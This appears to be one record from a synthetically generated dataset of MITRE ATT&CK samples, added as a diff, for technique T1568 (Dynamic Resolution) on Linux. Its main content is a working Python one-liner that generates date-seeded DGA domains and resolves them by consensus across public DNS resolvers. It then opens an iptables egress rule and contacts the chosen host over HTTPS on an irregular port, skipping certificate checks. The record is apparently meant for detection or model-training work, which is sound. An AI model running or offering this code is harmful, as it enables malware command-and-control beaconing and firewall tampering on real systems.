@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Python",
+  "command": "python3 -c \"import random,datetime,hashlib,subprocess; from collections import Counter; from scapy.all import IP,UDP,DNS,DNSQR,sr1\nseed='consensus'; tlds=['net','org','com']\ndef dga(n):\n    base=str(datetime.datetime.utcnow().strftime('%Y%m%d'))+seed\n    return [hashlib.sha256((base+str(i)).encode()).hexdigest()[:11]+'.'+tlds[i%len(tlds)] for i in range(n)]\nresolvers=['8.8.8.8','1.1.1.1','9.9.9.9']\ndom=None; ip=None; port=random.choice([8443,5359,16000])\nfor d in dga(20):\n    ips=[]\n    for r in resolvers:\n        resp=sr1(IP(dst=r)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=d,qtype='A')),timeout=2,verbose=0)\n        if resp and resp[DNS] and resp[DNS].an:\n            for a in resp[DNS].an:\n                if getattr(a,'type',0)==1:\n                    ips.append(a.rdata)\n    if ips:\n        c=Counter(ips).most_common(1)[0]\n        if c[1]>=2:\n            dom=d; ip=c[0]; break\nif ip and dom:\n    subprocess.run(['iptables','-I','OUTPUT','-p','tcp','-d',ip,'--dport',str(port),'-j','ACCEPT'])\n    subprocess.run(['curl','-sS','--connect-timeout','3','--resolve',f'{dom}:{port}:{ip}',f'https://{dom}:{port}/ok','-k'])\n    print(dom,ip,port)\"",
+  "explanation": "Achieves dynamic C2 resolution by querying multiple resolvers and selecting an IP that appears in at least two answers to reduce poisoning/noise.",
+  "rationale_steps": [
+    "Generate a set of DGA domains for trial.",
+    "Query 3 public resolvers and collect A answers for each candidate.",
+    "Pick the IP with resolver consensus to stabilize dynamic selection.",
+    "Allowlist and probe the chosen irregular port at the resolved IP."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1568-c17789a5-a15b04ba",
+  "source_prompt_hash": "c17789a5",
+  "timestamp_utc": "2025-09-30T09:50:51.932802Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
